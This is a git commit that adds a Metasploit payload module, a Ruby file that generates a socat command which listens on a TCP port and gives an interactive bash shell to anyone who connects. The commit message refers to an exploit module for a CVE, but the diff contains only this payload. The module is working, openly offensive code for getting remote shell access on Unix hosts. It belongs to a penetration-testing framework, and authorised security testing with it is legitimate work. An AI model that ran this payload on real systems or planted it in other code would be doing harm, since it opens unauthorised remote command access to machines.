99ba859a0bdc85d6c23958a8fb8b4e8d7dd38b33
sfewer-r7 <stephen_fewer@rapid7.com>
2026-06-02 12:09:26 +0100

    add in exploit module for CVE-2026-0826

---
+++ modules/payloads/singles/cmd/unix/bind_socat_tcp.rb
@@ -0,0 +1,54 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+module MetasploitModule
+  CachedSize = :dynamic
+
+  include Msf::Payload::Single
+  include Msf::Sessions::CommandShellOptions
+
+  def initialize(info = {})
+    super(
+      merge_info(
+        info,
+        'Name' => 'Unix Command Shell, Bind TCP (via socat)',
+        'Description' => 'Creates an interactive shell via socat',
+        'Author' => 'sfewer-r7',
+        'License' => MSF_LICENSE,
+        'Platform' => 'unix',
+        'Arch' => ARCH_CMD,
+        'Handler' => Msf::Handler::BindTcp,
+        'Session' => Msf::Sessions::CommandShell,
+        'PayloadType' => 'cmd',
+        'RequiredCmd' => 'socat',
+        'Payload' => {
+          'Offsets' => {},
+          'Payload' => ''
+        }
+      )
+    )
+    register_advanced_options(
+      [
+        OptString.new('SocatPath', [true, 'The path to the Socat executable', 'socat']),
+        OptString.new('BashPath', [true, 'The path to the Bash executable', 'bash'])
+      ]
+    )
+  end
+
+  #
+  # Constructs the payload
+  #
+  def generate(_opts = {})
+    vprint_good(command_string)
+    return super + command_string
+  end
+
+  #
+  # Returns the command string to use for execution
+  #
+  def command_string
+    "#{datastore['SocatPath']} tcp-l:#{datastore['LPORT']},fork exec:'#{datastore['BashPath']}'"
+  end
+end
